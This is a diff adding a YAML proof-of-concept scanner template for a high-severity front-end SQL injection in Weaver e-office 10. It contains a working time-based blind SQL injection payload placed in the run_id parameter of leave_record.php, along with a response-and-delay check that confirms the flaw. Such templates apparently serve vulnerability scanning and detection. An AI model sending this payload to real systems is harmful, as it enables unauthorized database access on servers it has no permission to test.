@@ -1,0 +1,14 @@
+id: poc-yaml-weaver-eoffice-v10-sql-injection
+info:
+  name: 泛微-Eoffice10-run_id-前台-SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+requests:
+- method: GET
+  path: /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1'%20AND%20(SELECT%202859%20FROM%20(SELECT(SLEEP(5)))ejwo)%20AND%20'WKQf'='WKQf&table_field=1&table_field_name=user()&max_rows=10
+  expression: status_code == 200 && contains(body, "未找到相关数据") && contains(body, "<div
+    class=\"empty-tip\">") && duration > 10
+variables: {}
+transport: http
